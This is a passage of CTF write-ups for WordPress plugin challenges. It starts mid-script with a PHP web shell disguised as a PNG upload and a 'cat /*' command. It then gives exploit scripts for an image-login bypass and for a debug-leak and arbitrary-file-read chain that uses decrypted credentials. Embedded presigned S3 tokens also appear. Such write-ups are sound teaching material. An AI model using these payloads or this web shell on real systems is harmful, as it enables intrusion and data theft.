URL = "http://3.14.248.34:9019/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    def make_user(self, user_login: str, user_pass: str, firs_name: str, last_name: str):
        return self.c.post("/wp-json/%F0%9F%8F%A0/%F0%9F%AA%A8/%F0%9F%97%AF%EF%B8%8F", data={"👤": user_login, "🔑": user_pass, "🥇": firs_name, "🏁": last_name})
    def upload_image(self, image: str, nonce: str):
        return self.c.post("/wp-json/%F0%9F%8F%A0/%F0%9F%AA%A8/%F0%9F%96%BC%EF%B8%8F", files={"🖼️": image}, data={"_wpnonce": nonce})
class API(BaseAPI):
    ...

async def main():
    api = API()
    username = "asdniqws"+str(random.randint(0, 100000))
    password = "asdniqws"+str(random.randint(0, 100000))
    res = await api.make_user(username, password, ".../.././", "")
    print(res.text)
    res = await api.c.post("/wp-login.php", data={
        "log": username,
        "pwd": password
    })
    res = await api.c.get("/wp-admin/")
    # get only nonce
    nonce = re.search(r"wpApiSettings.*nonce\":\"([a-f0-9]+)\"", res.text).group(1)
    print(nonce)
    # add mime of png
    mimpng = b"\xFF\xD8\xFF\xDB"
    mimpng += b"<?php system($_GET['cmd']); ?>"
    res = await api.upload_image(("tests.png.php", mimpng), nonce)
    url = res.json()['🖼️']
    print(url)
    res = await api.c.get(url+"?cmd=cat /*")
    print(res.text)


if __name__ == "__main__":
    asyncio.run(main())
```

Flag:

![](./imgs/image_qBEpoQQ3.png)

# **Say Cheese and Authenticate**

## Challenge Information

Description

    Passwords are a thing of the past. Now with 'Say Cheese and Authenticate' you can allow your users to login via a secure login page by using an image instead of a password.

    by Savphill and Patchstack team

    NOTE: This is a fully white box challenge, no heavy brute force is needed.

    [http://3.14.248.34:9047/](http://3.14.248.34:9047/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/76eb8803-5a49-4260-8b13-b3bd9f2db26c/attachment_%285%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663LSCBFK6%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T132320Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCIF%2BbyG5AfajKzhX3fMvFvuHRCs3kx0FPrP%2BqrAX%2BIyZsAiAO6%2FoiL9USX1vfN6mYTJdaUjE6558v0pWlDa5vU5mU%2BCqIBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM3zJxXjuobW1HtsR7KtwDphVoPHHVPNYCkUb%2BCKl585FBECoLSROkC5k4eov6XzWoP6q6wYJpG1rfSTT54NoNrSat2eVEqTcwVbLIs%2FNvw564MSOXrsM6lpf1l6%2FleLsQ7hUey%2BZliK0YRyl6NU3YIucSUevYY0yHObXhKOEV2AGOifUx%2BlirMDACJ%2BvFDg7EYg9ScHh4jNIlm3%2BgSe1lpsO4Oe01zlfHhXtbB%2FjrnM%2FawFm5dVjl8wh88WDZQa39cEEG1nlHuKeL%2BAVcoBdXD6J1KSjBpIoxNX8z1w9rJ%2FJhz56AHrTWYTcsZNuHKEy3u2187rIe9aYaFs%2FQeUEfoQ2V4MjtpzXQiYlWBfglkhgPAUYIE99R2TkJD6jKV6iGWieTgmQQ7D9AciewBe4NI4tGHPLfcuIoOLCYz65TdstxcBZLjj0CI7W1VGffhMocpWrOMp1kw21PQ6VwbdIjfZs9AgJuSyN4aeYgubRJZESsM5oxxk5XuAqpJfKc0NedpM5GyM9PrmiQyiTNB2pIqijZgqrn2wuiD00C5GAEexB8moZCvXioU8BA9Q0rK5a129HvpJ%2BJaOcZZw%2FIeBEU8kxUwd2NujAVvwn4PyKBnNgcZfZ0OVbRx%2FOBrqKYTSyQfWamFXpm5CpBMoswrdjBwQY6pgHymRCoFQXzP3RkNNRdE1zK9V85bARLKfoeUBYLjdnNUP1o25V4d9fx3PsnYBaKtQvwavAaVRoWkWSGtfeXq9wzOg0KfR5OFR8GVRJipY3UyunYjZ6%2FkUUOwnKG%2BDFCn8cGjMjG9aPVTJ7zknop9NKd0nLiGjxRN3GPp1%2FOobxeQOX38KtTiuNYPxXXk34EyMjJk14VSqHRzAZtkUtR0qI%2BWYywmVXl&X-Amz-Signature=df7bd0eddfbb0770e6b0ab709ebf5c8f28aadfa744f05bcbc7bbc3b6b29bc586&X-Amz-SignedHeaders=host&x-id=GetObject)

## Understanding the Challenge

In this challenge, there's a plugin that authenticates users using an image. Here's a portion of the code:

```php
add_action('wp_ajax_nopriv_say_cheese_handle_image_login', 'say_cheese_handle_image_login');
function say_cheese_handle_image_login() {
    if (isset($_GET["imagelogin"])) {

        $message = '';

        // Handle form submission
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'])) {
            $username = sanitize_text_field($_POST['username']);
            $uploaded_image = $_FILES['image'] ?? null;
            if (say_cheese_upload_and_authenticate($username, $uploaded_image)) {
                wp_redirect(admin_url());
                exit;

...snip...
function say_cheese_upload_and_authenticate($username, $uploaded_image) {
    $user = get_user_by('login', $username);
    if (!$user || !$uploaded_image) return false;


    $allowed_mime_types = ['image/png', 'image/jpeg'];
    $uploaded_mime_type = mime_content_type($uploaded_image['tmp_name']);

    if (!in_array($uploaded_mime_type, $allowed_mime_types)) {
        return false; // Reject the file if it's not PNG or JPEG
    }

    // Encrypt the username using Say Cheese Encryption
    $encrypted_username = say_cheese_encrypt($username, intval(getenv("HOW_MANY")));

    $image_path = WP_CONTENT_DIR . '/uploads/say_cheese_images/' . $encrypted_username . '.png';

    if (file_exists($image_path)) {
        $stored_image_hash = hash_file('md5', $image_path);
        $uploaded_image_hash = md5_file($uploaded_image['tmp_name']);
        if ($stored_image_hash === $uploaded_image_hash) {
            if($user->ID !== 1){
                wp_set_auth_cookie($user->ID);
                return true;
            }

        }
    }
    return false;
}
```

The plugin will automatically create a user with the following code:

```php
register_activation_hook(__FILE__, 'create_user_and_assign_image');

function create_user_and_assign_image() {
    // Step 1: Create the 'johnstilton1' user if not already exists
    $how_many = 11;
    $username = 'johnstilton1'; // The fixed username
    $email = 'johnstilton1@example.com'; // Change the email if needed
...snip...
```

## Exploitation

To solve this challenge, we just need to authenticate as a user using the image from the real server, which we can access at `/wp-content/plugins/add-user/pp.png`. After that, we can check the path of the flag media by accessing `/wp-json/wp/v2/media/`.

## Obtaining the Flag

Here is my solve script to solve the challenge:

```python
import httpx
import asyncio

# URL = "http://localhost:9047"
URL = "http://3.14.248.34:9047/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    def say_cheese_handle_image_login(self, imagelogin, username, image):
        return self.c.post("/wp-admin/admin-ajax.php", data={
            "username": username,
        }, files={
            "image": image,
        }, params={
            "action": "say_cheese_handle_image_login",
            "imagelogin": imagelogin,
        })

class API(BaseAPI):
    ...

async def main():
    api = API()
    image = await api.c.get("wp-content/plugins/add-user/pp.png")
    res = await api.say_cheese_handle_image_login(True, "johnstilton1", ("image", image.content, "image/png"))
    # print(res.text)
    # print(res.status_code)
    # print(res.headers)
    res = await api.c.get("/wp-json/wp/v2/media/")
    print(res.json()[0]['guid']['rendered'])

if __name__ == "__main__":
    asyncio.run(main())
```

Output

![](./imgs/image_6MHUirSu.png)

flag:

![](./imgs/image_vXL2nmNA.png)

# **Half Baked**

## Challenge Information

Description

    My site is a little... undercooked. The apprentice is developing a new baking recipe repo for my bakery and it looks like they decided to put a batch in before the oven was pre-heated!

    by ghsinfosec

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed, however, some educated guessing may apply.

    [http://3.14.248.34:9035](http://3.14.248.34:9035/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/f60405cf-9acf-4f16-8f65-f810aa1ab2c2/attachment_%283%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665QAZT7AF%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T132320Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJIMEYCIQCcNpP1cxD3WFIFeQe1QsKzo%2BIORbMFgLBBiQsku1ntjAIhAMt4euAZJ9h3MdYBeGweXFy2%2FM6LvoOMRkjeqFIV%2F2AyKogECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwlacEyxx0iIFLYKGsq3AOOsWO29XtfDfpqZq2VAJRzZunlY%2FmAdHRaw6O%2FHspyVjQqBxIFPKASOUGE5eAa6%2Fgjz8hPsyLQodVjzlbwSdCmoMjaHuJdqM4K8zeZvG3Lf5%2FgJwIh4XPQgoz1hoU8ucVVQMhezRLl7sYSQeXCty7GJKBeqtjiVqo6tusn%2BQLofb9pgtUO3vSyH4G7mSgcefSFPNEWTjx0DUzwpBIJiF0Tig9bQjMyTlqF%2B79sic5iLSI9%2B2M%2Bpd%2BY7BjxIM%2FOl5%2FRk8vDNgVC72%2BzOMK67RSrQsbs9yn9%2FNLtrm5qeen6vxlmbiXiEPdrpOCEg1UXgSdyvZFzWwPN5s22pMuMasjx77ICMC6J1CtGsKEaAhfuRilvKDte916Kavv5Cr7f7cpnVYJ4oTrh9D%2BoChawjA5oq8%2BHpSSQACjtpmft5rSUPY59MIcBbvUxt3Sgb5ZQRPObp5Nf8HjAnabjOFcWHIKvJ2hdKJtHnDBqJw4QGULp5%2BuTXz76H4s7rYC5mDn%2B8bEsvwULnRAE9ST4mH4OnbKQz7jSya5wjA9n9cSwZPzR1LxqOoYVresqUyrOMWhOGgmuNqoJ%2FY9a%2FaUXB7dpO32ofIKw%2B%2BipUVqGrdYaHF0bFiht6hyD5%2BjLZTiJazCp2MHBBjqkAUpAg0yIJvZntfF%2Bit9Yg0ZhWa26agRtOFdczPDLRKZ7Fo%2FWuatZbrhkx8T6IW3Sy%2BG9iu9Z0px7HsOpVWAujHzjwqno5vVYAsVyMbvP%2B9eRkRHk3xWwu4kzEswWrXRuY5JesL1KoI9epbm2%2BWj3vzjBXM21zWqb83WP3vI7WbxmDGCcpTjszdGLpTznYwqG7l4RvBOJg6B%2Fg5uZuDBjgzJa6KWA&X-Amz-Signature=2b5e96ced706558ae556d49ec22fd32b0f0d2fcc11e7c642818dc47a7dec7593&X-Amz-SignedHeaders=host&x-id=GetObject)

## Exploitation

To exploit this challenge, we first need to authenticate by obtaining the encoded credentials from `server-given/challenge-custom/message.txt` on the real server. We can retrieve this information by calling the debug REST API endpoint:

```python
        register_rest_route('half-baked/v1', '/debug', array(
            'methods' => 'GET',
            'callback' => array(self::class, 'activate_debug'),
            'permission_callback' => '__return_true',
        ));
        ...snip...
    public static function activate_debug($request) {
        $contents = file_get_contents('/message.txt');
        ...snip...
        return rest_ensure_response([
            'status' => 'error',
            'message' => array(
                'info' => 'Sorry, debug mode failed to launch',
                'data' => $contents,
            ),
        ], 401);
    }

```

Then, we use the following key and IV to decode the hash:

```php
// $key = '379444613f1519968b44a36fa51c544a';
// $iv = 'e59fc938f4eb1370bb9fef8a8b495bac';
```

Using CyberChef, we can decode the encoded credentials. Here's the result:

![](./imgs/image_m1MCmnyX.png)

After obtaining the credentials and logging in, we need to call `activate_debug` again to set our transient:

```php
    public static function activate_debug($request) {
        $contents = file_get_contents('/message.txt');
        $debug = $request->get_header('x-debug-mode');
        $user_id = get_current_user_id();
        $user_data = get_userdata($user_id);

        if($debug && $user_id) {
            $user_data->add_cap('edit_posts');
            set_transient('half_baked_dev_' . $user_id, ['edit_posts'], 60); // transient is good for 60 seconds

            return rest_ensure_response(array(
                'status' => 'success',
                'message' => array(
                    'info' => 'Debug mode activated',
                    'test_entry' => array(
                        'author' => 'headbaker',
                        'note' => 'Use the info in /note.txt for final automation testing',
                        'entry_data' => 'blah blah ingredients blah... mix the stuff, do the thing...',
                    ),
                ),
            ));
        }
```

Next, we use the `test_post_recipe` function to achieve arbitrary file read and read the contents of `note.txt`:

```php
    public static function test_post_recipe($request) {
        $filename = $request->get_header('x-file');
        $user_id = get_current_user_id();
        $user_caps = get_transient('half_baked_dev_'. $user_id);

        if(is_array($user_caps) && in_array('edit_posts', $user_caps)) {
            if($filename) {
                $file = file_get_contents($filename);
```

After retrieving the contents of `note.txt`, use that information to get the flag using the `get_flag` function:

```php
    public static function get_flag($request) {
        $key = getenv('SECRET_INGREDIENT');
        $header = $request->get_header('x-secret-key');

        if($key === $header) {
            return rest_ensure_response(array(
                'status' => 'success',
                'flag' => getenv('X_FLAG'),
            ));
        }
```

## Obtaining the Flag

Here is my solve script to solve this challenge:

```python
import httpx
import asyncio

URL = "http://3.14.248.34:9035/"
# URL = "http://localhost:9035/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    def debug(self):
        return self.c.get("/wp-json/half-baked/v1/debug", headers={"x-debug-mode": "1"})
    def postrecipe(self, file):
        return self.c.post("/wp-json/half-baked/v1/post-recipe", headers={"x-file": file})
    def auto_login(self, username):
        return self.c.post("/wp-json/half-baked/v1/auto-login", data={"username": username})
    def get_flag(self, secret):
        return self.c.get("/wp-json/half-baked/v1/get-flag", headers={"x-secret-key": secret})

class API(BaseAPI):
    ...

async def main():
    api = API()
    """
    https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')AES_Decrypt(%7B'option':'Hex','string':'379444613f1519968b44a36fa51c544a'%7D,%7B'option':'Hex','string':'e59fc938f4eb1370bb9fef8a8b495bac'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=OWI1MGFjNjhlMjBmZTVjMmY5OTFmYmY5YzUwZDMwNzM4ZGZiMDFjYzIxODA4OTFlZWU0NTY2Y2NmYWQ4YTRhY2M0ODI1M2VkYTQ0ZGQwZTA1ODdhNWNiYWY3N2JhNmQzYWM5YmFkNDgzNGU3MGM0NzczODU4YWUyZDE1NjI5OGI5MDFhM2U4ZDFhYWI4Nzg1ZGVlYzM4NjIzNDdjMzJjMg
    """
    res = await api.c.post("/wp-login.php", data={
        "log": "apprentice",
        "pwd": "891b90c73e9bdf2fe6f284d6f133ae49"
    })
    res = await api.debug()
    res = await api.postrecipe(f"/note.txt")
    print(res.text)
    secret = "kosher"
    res = await api.auto_login("admin")
    print(res.headers)
    res = await api.get_flag(secret)
    print(res.text)


if __name__ == "__main__":
    asyncio.run(main())
```

Flag:

![](./imgs/image_9IcRrNpV.png)

# **Something**

## Challenge Information

Description

    No comment, it's something.

    by Patchstack team

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

    [http://3.14.248.34:9055](http://3.14.248.34:9055/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/b6701b06-e496-4868-9463-96460d65390e/attachment_%284%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZGR77NES%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T132321Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQDkpmc8LZxuA%2F3eaCl%2FtG92jvE%2ByoHn9gmo6q6AVcm29AIgDdLoFz7qPp4zMk42xXuCrXcI9aBtdEDn5elCyQuTynYqiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDMApBgA5fVLGntKpdyrcA0soozDgfmzZVzqoBuZA8J07Etus0gp3TBNRX2S4WNKYot3kM%2FoUyLUQRz9jlmpIFQyBIYUHMxZsIeqnvxidz7hJp8uj1ZdMHiY79WZm5TWyUwbkQBLVyfXphlSHXRy09GxSVL2fL9S%2BpEg7OgjVkfKeXCxXrMBU38ZmgUQyUothPlaImpJqY3biFvjklsPCUr8fjfBaUVn6xCgHmt8xjq8cxE%2Fvvpb1J4Fu7uuCiGX6FANLdvJ3hvzm6Sl6Xt37bdSO1OUV5s2kX%2BOBzWTa0wzNZpzsztvc5Ix6NeJCzOBpKpo09Iznqn63PSlis%2BnRcRliUDYLY%2BzZscs7ol2OvWlDycqVoOB1Nwxy57c3E6gOczAeTQYEfBsHjsehqG%2FzDIZefqTKqo81AAPME1x3a67cXBTIZAztaYd0spkz6c2YzuhfismGZqs3Ey2ZE2%2FWj6kuq3kxEopATVKuKGYpMwvrwwOg5n3VlfAm9G3JVFrZ4B3TicYhQw6ddxvIYjxaCLjEEHoVJZbOdSBZ1m0rPwogvekNyG6vq6Zuuyqdi4UREkzgFW4RuHXochIs3gmeyCUxkkyneGaNM8q0PPJL2FgYEqW1pQ2dcpPgthXUA1wrE0nRXgJTkL6FBktDMKjYwcEGOqUBIYSlgtCPdfsOZAibR2lcr%2BjcMthK12UvBmxF5ttblN7bv%2F8EcHOHnTsUMr%2FG0sj5OfXRneYnsgqXCvlm4%2BevM9bjmgJ%2BKlVvJ9oBAOHXAvnaRdSXp6I6R95rYcvM11Jcdqtr0BdyNRKvuT3WQBv3sUTuZxFZ69qKNrC%2BmyynIL0XLJ2AabbAQcPUyugMM6LSyaYAZlRM8Pm8ytWIqEbRvM1wy%2BtO&X-Amz-Signature=a6c5a8aca85dc9f45bb01d883fc26562a79629048ab56199d7130cee5a07fac0&X-Amz-SignedHeaders=host&x-id=GetObject)

## Exploitation

TL;DR to solve this challenge, we can use a zero-day exploit from a \[REDACTED] plugin to read the post title. Before that, you need to register to gain contributor access using the following code:

```php
add_action("wp_ajax_nopriv_register_user", "register_user");

function register_user(){
    $userdata = array(
        'user_login' => sanitize_text_field($_POST["username"]),
        'user_pass' => sanitize_text_field($_POST["password"]),
        'user_email' => sanitize_text_field($_POST["email"]),
        'role' => 'contributor',
    );

    wp_insert_user($userdata);
    echo "user created";
}
```

## Obtaining the Flag

![](./imgs/proof_rcDJHBxe.jpg)
